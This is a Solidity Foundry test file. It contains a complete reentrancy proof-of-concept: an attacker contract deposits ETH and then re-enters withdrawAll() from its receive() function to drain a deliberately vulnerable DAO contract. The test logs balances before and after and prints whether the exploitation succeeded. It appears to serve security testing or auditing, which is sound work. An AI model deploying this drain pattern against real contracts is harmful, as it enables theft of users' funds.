// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_dao.sol";

contract MaliciousAttacker {
    ReentrancyDAO public dao;

    constructor(ReentrancyDAO _dao) {
        dao = _dao;
    }

    function attack() external payable {
        // Deposit to become a valid creditor using ETH sent with the call
        dao.deposit{value: msg.value}();
        // Begin the attack by triggering withdrawal
        dao.withdrawAll();
    }

    // Fallback function that re-enters during ETH transfer
    receive() external payable {
        // Re-enter only once and if DAO has sufficient balance
        if (address(dao).balance >= 1 ether) {
            // Only reenter once to drain both deposits
            dao.withdrawAll();
        }
    }
}

contract ReentrancyDAO_Reentrancy_Test is Test {
    ReentrancyDAO public dao;
    MaliciousAttacker public attacker;
    address public helper;

    function setUp() public {
        // Deploy the vulnerable contract
        dao = new ReentrancyDAO();
        // Deploy attacker contract without funding
        attacker = new MaliciousAttacker(dao);
        // Setup helper account for initial funded deposit
        helper = makeAddr("helper");

        // Funds helper & deposits 1 ETH into DAO
        vm.deal(helper, 1 ether);
        vm.prank(helper);
        dao.deposit{value: 1 ether}();
    }

    function testReentrancyAttack() public {
        // Verify initial deposits
        assertEq(address(dao).balance, 1 ether);
        assertEq(dao.getUserCredit(helper), 1 ether);
        
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 contractBalanceBefore = address(dao).balance;
        uint256 attackerCreditBefore = dao.getUserCredit(address(attacker));
        uint256 helperCreditBefore = dao.getUserCredit(helper);
        uint256 attackerEthBalanceBefore = address(attacker).balance;
        console.log("Contract ETH balance: ", contractBalanceBefore);
        console.log("Attacker credit: ", attackerCreditBefore);
        console.log("Helper credit: ", helperCreditBefore);
        console.log("Attacker ETH balance: ", attackerEthBalanceBefore);
        
        console.log("--- Trigger Attack ---");
        // Launch attack with exactly 1 ETH for deposit
        vm.deal(address(this), 1 ether);  // Fund the test contract
        (bool success, ) = address(attacker).call{value: 1 ether}(abi.encodeWithSignature("attack()"));
        require(success, "Attack failed");
        
        console.log("--- AFTER-Trigger Attack ---");
        uint256 contractBalanceAfter = address(dao).balance;
        uint256 attackerCreditAfter = dao.getUserCredit(address(attacker));
        uint256 helperCreditAfter = dao.getUserCredit(helper);
        uint256 attackerEthBalanceAfter = address(attacker).balance;
        console.log("Contract ETH balance: ", contractBalanceAfter);
        console.log("Attacker credit: ", attackerCreditAfter);
        console.log("Helper credit: ", helperCreditAfter);
        console.log("Attacker ETH balance: ", attackerEthBalanceAfter);
        
        console.log("--- State Comparison Verdict ---");
        bool vulnerabilityExists = 
            contractBalanceAfter == 0 && 
            attackerEthBalanceAfter == 2 ether && 
            attackerCreditAfter == 0 && 
            helperCreditAfter == 1 ether;
        console.log("State changed as expected:", vulnerabilityExists ? "YES" : "NO");
        console.log("Exploitation successful:", vulnerabilityExists ? "YES" : "NO");
        
        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Reentrancy attack drained contract ETH balance while unexpected credits remain");
        } else {
            console.log("Vulnerability not Exist: Attack did not result in expected state changes");
        }
    }
}